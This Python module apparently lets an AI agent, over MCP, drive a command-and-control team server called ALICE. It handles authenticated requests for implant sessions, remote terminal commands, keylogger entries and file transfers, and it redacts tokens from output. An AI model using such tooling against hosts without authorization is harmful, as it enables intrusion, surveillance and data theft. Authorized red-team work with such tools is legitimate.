import base64
import json
import logging
import os
import re
from urllib.parse import quote
import httpx
from logic import agent_notes
from utils import config

logger = logging.getLogger("mcp_server.team_http")
token_cache = {"value": ""}
report_tag_pattern = re.compile(r"^[\w.-]+$")
binary_max_bytes = 52_428_800

def require_mcp_enabled():
    # Blocks API calls when launcher disabled MCP in server.conf
    if not config.enabled:
        raise RuntimeError(agent_notes.operator_note("disabled"))

def redact_payload(text):
    # Strips bearer tokens from strings that may be returned to the model

    if not text:
        return text

    cleaned = text
    for key in ("access_token", "aesKey", "password", "secret"):
        marker = f'"{key}":'
        while marker in cleaned:
            start = cleaned.index(marker) + len(marker)
            end = cleaned.find(",", start)

            if end == -1:
                end = cleaned.find("}", start)

            if end == -1:
                break

            cleaned = cleaned[:start] + ' "<redacted>"' + cleaned[end:]
    return cleaned

def validate_host_tag(tag):
    # Normalizes and validates a session tag before any implant action
    value = str(tag or "").strip()

    if not value:
        raise ValueError("host_tag is required")

    if not config.host_tag_pattern.fullmatch(value):
        raise ValueError("host_tag must be 3-32 alphanumeric characters")

    return value

def validate_command(command):
    # Normalizes and bounds terminal command length
    value = str(command or "").strip()

    if not value:
        raise ValueError("command must not be empty")

    if len(value) > config.command_max_chars:
        raise ValueError(f"command exceeds {config.command_max_chars} characters")

    return value

def validate_report_tag(tag):
    # Normalizes report tags used by /api/reports/{tag} paths
    value = str(tag or "").strip()

    if not value:
        raise ValueError("report_tag is required")

    if not report_tag_pattern.fullmatch(value):
        raise ValueError("report_tag must contain only letters, digits, dot, hyphen, or underscore")

    return value

def validate_file_name(file_name):
    # Matches server file_server schema: basename only, no path traversal

    if not isinstance(file_name, str):
        raise ValueError("file_name is required")

    name = os.path.basename(file_name.replace("\\", "/")).strip()

    if not name or name in (".", ".."):
        raise ValueError("file_name is required")

    if len(name) > 255:
        raise ValueError("file_name exceeds 255 characters")

    return name

def validate_entry_tag(tag):
    # Normalizes queue and keylogger row tags before DELETE routes
    value = str(tag or "").strip()

    if not value:
        raise ValueError("entry_tag is required")

    if len(value) > 256:
        raise ValueError("entry_tag exceeds 256 characters")

    return value

def quote_path_segment(segment):
    # Encodes one URL path piece for listener tags and file names
    return quote(str(segment), safe="")

def dispatch_http(client, method, url, headers, body=None, params=None):
    # Sends one httpx call for the supported REST verbs

    if method == "GET":
        return client.get(url, headers=headers, params=params or {})

    if method == "POST":
        return client.post(url, headers=headers, json=body or {})

    if method == "PUT":
        return client.put(url, headers=headers, json=body or {})

    if method == "PATCH":
        return client.patch(url, headers=headers, json=body or {})

    if method == "DELETE":
        if body is not None:
            return client.request("DELETE", url, headers=headers, json=body)
        return client.delete(url, headers=headers)

    raise ValueError(f"unsupported method {method}")

def login_for_token(client):
    # Obtains a JWT from the team server login endpoint

    if not config.operator_key_line:
        raise RuntimeError(agent_notes.operator_note("missing_credentials"))

    body = {"operator_key": config.operator_key_line}
    response = client.post(f"{config.base_url}/auth/login", json=body)

    if response.status_code == 401:
        try:
            denied = response.json()
            hint = denied.get("message", "") if isinstance(denied, dict) else ""
        except json.JSONDecodeError:
            hint = ""
        raise RuntimeError(agent_notes.operator_note("unauthorized", detail=hint))

    response.raise_for_status()
    payload = response.json()

    if payload.get("status") != "success":
        message = payload.get("message", "login failed")
        raise RuntimeError(agent_notes.operator_note("unauthorized", detail=message))

    token = str(payload.get("access_token", "")).strip()

    if not token:
        raise RuntimeError(
            agent_notes.operator_note("unauthorized", detail="login response missing access_token"),
        )

    return token

def resolve_token(client):
    # Returns a cached or freshly loaded bearer token

    if token_cache["value"]:
        return token_cache["value"]

    token_cache["value"] = login_for_token(client)
    return token_cache["value"]

def team_request(method, path, body=None, params=None):
    # Sends one authenticated request to the ALICE team server API
    require_mcp_enabled()
    verb = str(method or "").strip().upper()

    if not path.startswith("/"):
        raise ValueError("path must start with /")

    timeout = httpx.Timeout(120.0, connect=15.0)
    with httpx.Client(verify=config.tls_verify, timeout=timeout) as client:
        token = resolve_token(client)
        headers = {"Authorization": f"Bearer {token}"}
        url = f"{config.base_url}{path}"
        response = dispatch_http(client, verb, url, headers, body=body, params=params)

        if response.status_code == 401:
            token_cache["value"] = ""
            token = resolve_token(client)
            headers = {"Authorization": f"Bearer {token}"}
            response = dispatch_http(client, verb, url, headers, body=body, params=params)

        try:
            payload = response.json()
        except json.JSONDecodeError:
            text = response.text[:4096]
            raise RuntimeError(f"non-json response ({response.status_code}): {text}")

        if response.status_code >= 400:
            message = payload.get("message") if isinstance(payload, dict) else str(payload)
            text = f"HTTP {response.status_code}: {message or payload}"

            if response.status_code == 401:
                raise RuntimeError(agent_notes.operator_note("unauthorized", detail=text))

            raise RuntimeError(text)

        return payload if isinstance(payload, dict) else {"status": "success", "data": payload}

def format_team_response(payload):
    # Serializes API JSON for MCP tool output
    text = json.dumps(payload, indent=2, ensure_ascii=False)
    return redact_payload(text)

def raise_http_error(response):
    # Turns failed HTTP responses into runtime errors with API messages
    try:
        payload = response.json()
    except json.JSONDecodeError:
        text = response.text[:4096]
        raise RuntimeError(f"HTTP {response.status_code}: {text}")

    if isinstance(payload, dict):
        message = payload.get("message") or payload
    else:
        message = payload

    if response.status_code == 401:
        raise RuntimeError(
            agent_notes.operator_note(
                "unauthorized",
                detail=f"HTTP {response.status_code}: {message}",
            ),
        )

    raise RuntimeError(f"HTTP {response.status_code}: {message}")

def send_authenticated(
    client,
    method,
    url,
    *,
    params=None,
    json_body=None,
    content=None,
    content_type=None,
):
    # Performs one bearer-authenticated call with a single 401 retry
    token = resolve_token(client)
    headers = {"Authorization": f"Bearer {token}"}

    if content_type:
        headers["Content-Type"] = content_type

    def execute():

        if method == "GET":
            return client.get(url, headers=headers, params=params or {})

        if method == "POST":
            if content is not None:
                return client.post(url, headers=headers, content=content)
            return client.post(url, headers=headers, json=json_body or {})

        if method == "PATCH":
            return client.patch(url, headers=headers, json=json_body or {})

        if method == "DELETE":
            return client.delete(url, headers=headers)

        raise ValueError(f"unsupported method {method}")

    response = execute()

    if response.status_code != 401:
        return response

    token_cache["value"] = ""
    token = resolve_token(client)
    headers["Authorization"] = f"Bearer {token}"
    return execute()

def team_get_binary(path, params=None):
    # Downloads raw bytes (file_server download); MCP output uses base64, capped at 50 MiB
    require_mcp_enabled()
    timeout = httpx.Timeout(120.0, connect=15.0)
    url = f"{config.base_url}{path}"
    with httpx.Client(verify=config.tls_verify, timeout=timeout) as client:
        response = send_authenticated(client, "GET", url, params=params)

        if response.status_code >= 400:
            raise_http_error(response)

        data = response.content or b""

        if len(data) > binary_max_bytes:
            raise RuntimeError(
                f"download exceeds {binary_max_bytes} bytes; use a smaller file or another channel"
            )

        media = response.headers.get("content-type", "application/octet-stream")

        if media.startswith("application/json"):
            try:
                payload = response.json()
            except json.JSONDecodeError:
                raise RuntimeError("unexpected JSON download body")
            if isinstance(payload, dict):
                return payload

        encoded = base64.b64encode(data).decode("ascii")
        return {
            "status": "success",
            "content_type": media,
            "size": len(data),
            "content_base64": encoded,
        }

def team_post_binary(path, data):
    # Uploads raw bytes to POST routes that expect a request body (file_server upload)

    if data is None:
        raise ValueError("upload bytes are required")

    if len(data) > binary_max_bytes:
        raise ValueError(f"upload exceeds {binary_max_bytes} bytes")

    timeout = httpx.Timeout(120.0, connect=15.0)
    url = f"{config.base_url}{path}"
    with httpx.Client(verify=config.tls_verify, timeout=timeout) as client:
        response = send_authenticated(
            client,
            "POST",
            url,
            content=data,
            content_type="application/octet-stream",
        )

        if response.status_code >= 400:
            raise_http_error(response)

        try:
            payload = response.json()
        except json.JSONDecodeError:
            text = response.text[:4096]
            raise RuntimeError(f"non-json upload response ({response.status_code}): {text}")

        if not isinstance(payload, dict):
            return {"status": "success", "data": payload}

        return payload

def collect_terminal_stream_events(response):
    # Turns an NDJSON terminal download body into JSON-safe event metadata
    events = []
    for line in response.iter_lines():

        if line is None:
            continue

        if isinstance(line, bytes):
            if not line:
                continue
            try:
                text = line.decode("utf-8")
            except UnicodeDecodeError:
                events.append({"status": "chunk", "binary_bytes": len(line)})
                continue
        else:
            text = str(line)

        stripped = text.strip()

        if not stripped:
            continue

        try:
            events.append(json.loads(stripped))
        except json.JSONDecodeError:
            events.append({"status": "chunk", "binary_bytes": len(stripped.encode("utf-8"))})
    return events

def post_terminal_download(body):
    # Runs a download terminal command and summarizes the NDJSON stream for MCP output
    require_mcp_enabled()
    timeout = httpx.Timeout(600.0, connect=15.0)
    url = f"{config.base_url}/api/terminal/"
    with httpx.Client(verify=config.tls_verify, timeout=timeout) as client:
        token = resolve_token(client)
        headers = {"Authorization": f"Bearer {token}"}
        response = client.post(url, headers=headers, json=body)

        if response.status_code == 401:
            token_cache["value"] = ""
            token = resolve_token(client)
            headers = {"Authorization": f"Bearer {token}"}
            response = client.post(url, headers=headers, json=body)

        content_type = (response.headers.get("content-type") or "").split(";")[0].strip().lower()

        if content_type == "application/x-ndjson":
            events = collect_terminal_stream_events(response)
            summary = {"status": "success", "stream": "ndjson", "events": events}
            return redact_payload(json.dumps(summary, indent=2, ensure_ascii=False))

        try:
            payload = response.json()
        except json.JSONDecodeError:
            text = response.text[:4096]
            raise RuntimeError(f"non-json terminal response ({response.status_code}): {text}")

        if response.status_code >= 400:
            message = payload.get("message") if isinstance(payload, dict) else str(payload)
            text = f"HTTP {response.status_code}: {message or payload}"

            if response.status_code == 401:
                raise RuntimeError(agent_notes.operator_note("unauthorized", detail=text))

            raise RuntimeError(text)

        return format_team_response(payload if isinstance(payload, dict) else {"data": payload})

def post_terminal_raw_upload(meta, file_bytes):
    # Sends terminal upload bytes with x-terminal-meta like the desktop client

    if not isinstance(file_bytes, (bytes, bytearray)) or len(file_bytes) < 1:
        raise ValueError("file_bytes must be a non-empty byte sequence")

    require_mcp_enabled()
    timeout = httpx.Timeout(120.0, connect=15.0)
    url = f"{config.base_url}/api/terminal/"
    meta_json = json.dumps(meta, ensure_ascii=False)
    header_value = quote(meta_json, safe="")
    with httpx.Client(verify=config.tls_verify, timeout=timeout) as client:
        token = resolve_token(client)
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/octet-stream",
            "x-terminal-meta": header_value,
        }
        response = client.post(url, headers=headers, content=bytes(file_bytes))

        if response.status_code == 401:
            token_cache["value"] = ""
            token = resolve_token(client)
            headers["Authorization"] = f"Bearer {token}"
            response = client.post(url, headers=headers, content=bytes(file_bytes))

        try:
            payload = response.json()
        except json.JSONDecodeError:
            text = response.text[:4096]
            raise RuntimeError(f"non-json terminal response ({response.status_code}): {text}")

        if response.status_code >= 400:
            message = payload.get("message") if isinstance(payload, dict) else str(payload)
            text = f"HTTP {response.status_code}: {message or payload}"

            if response.status_code == 401:
                raise RuntimeError(agent_notes.operator_note("unauthorized", detail=text))

            raise RuntimeError(text)

        return payload if isinstance(payload, dict) else {"status": "success", "data": payload}